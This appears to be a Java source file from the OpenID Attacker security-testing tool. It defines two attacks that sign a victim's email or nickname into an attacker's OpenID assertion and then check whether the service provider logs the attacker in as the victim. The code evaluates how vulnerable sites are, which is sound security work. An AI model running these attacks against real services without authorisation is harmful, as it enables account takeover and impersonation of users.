/*
 * OpenID Attacker
 * (C) 2015 Christian Mainka & Christian Koßmann
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;

public class MaliciousMetadataAttack extends AbstractAttack {

    public MaliciousMetadataAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }
    
    @Attack(number = 0)
    private AttackResult performEmailAttack() {
        // clear all parameters and log in
        serverController.getServer().clearParameters();
        LoginResult loginResult = serviceProvider.login(ServiceProvider.User.ATTACKER);
        
        
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String emailParameterName;
        
        // sreg or ax extension
        if (keeper.hasParameter("openid.sreg.email")) {
            emailParameterName = "openid.sreg.email";
        } else if (keeper.hasParameter("openid.ax.value.email")) {
            emailParameterName = "openid.ax.value.email";
        } else {
            return new AttackResult("SP does not request email.", loginResult, Result.NOT_PERFORMABLE, Interpretation.NEUTRAL);
        }
        
        String victimEmail = OpenIdServerConfiguration.getAnalyzerInstance().getValidUser().getByName("email").getValue();
        
        AttackParameter opEndpointParameter = keeper.getParameter(emailParameterName);
        opEndpointParameter.setAttackValueUsedForSignatureComputation(true);
        opEndpointParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        opEndpointParameter.setAttackMethod(HttpMethod.GET);
        opEndpointParameter.setAttackValue(victimEmail);
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        loginResult = serviceProvider.login(ServiceProvider.User.ATTACKER);
        
        boolean success = serviceProvider.determineAuthenticatedUser(loginResult.getPageSource(), loginResult.getUrlAfterLogin()) == ServiceProvider.User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;        
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("Email", loginResult, result, interpretation);
    }
    
    @Attack(number = 1)
    private AttackResult performNicknameAttack() {
        // clear all parameters and log in
        serverController.getServer().clearParameters();
        LoginResult loginResult = serviceProvider.login(ServiceProvider.User.ATTACKER);
        
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String nicknameParameterName;
        
        // sreg or ax extension
        if (keeper.hasParameter("openid.sreg.nickname")) {
            nicknameParameterName = "openid.sreg.nickname";
        } else if (keeper.hasParameter("openid.ax.value.nickname")) {
            nicknameParameterName = "openid.ax.value.nickname";
        } else {
            return new AttackResult("SP does not request nickname.", loginResult, Result.NOT_PERFORMABLE, Interpretation.NEUTRAL);
        }
        
        String victimNickname = OpenIdServerConfiguration.getAnalyzerInstance().getValidUser().getByName("nickname").getValue();
        
        AttackParameter opEndpointParameter = keeper.getParameter(nicknameParameterName);
        opEndpointParameter.setAttackValueUsedForSignatureComputation(true);
        opEndpointParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        opEndpointParameter.setAttackMethod(HttpMethod.GET);
        opEndpointParameter.setAttackValue(victimNickname);
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        loginResult = serviceProvider.login(ServiceProvider.User.ATTACKER);
        
        boolean success = serviceProvider.determineAuthenticatedUser(loginResult.getPageSource(), loginResult.getUrlAfterLogin()) == ServiceProvider.User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;        
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("Nickname", loginResult, result, interpretation);
    }
}
